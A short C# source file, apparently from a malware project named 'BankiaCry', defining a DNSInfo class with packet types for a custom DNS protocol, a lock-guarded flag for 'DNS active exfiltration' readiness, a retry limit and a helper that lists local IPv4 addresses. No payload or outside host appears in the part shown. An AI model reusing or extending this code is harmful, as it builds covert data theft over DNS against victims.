using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;

namespace BankiaCry;

public class DNSInfo
{
	public enum PacketType
	{
		HOST_SET_UP = 1,
		PASS,
		DATA,
		SOOK,
		POOK,
		WTFP,
		DATA_I
	}

	private static bool isDNSActiveExfilReady = true;

	private static readonly object _isDNSReadyLock = new object();

	public static int GetMaxDNSRetries()
	{
		return 3;
	}

	public static void SetDNSActiveExfiltration(bool up)
	{
		lock (_isDNSReadyLock)
		{
			isDNSActiveExfilReady = up;
		}
	}

	public static bool GetDNSActiveExfiltration()
	{
		lock (_isDNSReadyLock)
		{
			return isDNSActiveExfilReady;
		}
	}

	public static List<string> GetLocalIPAddresses()
	{
		List<string> list = new List<string>();
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily == AddressFamily.InterNetwork)
			{
				list.Add(iPAddress.ToString());
			}
		}
		return list;
	}
}
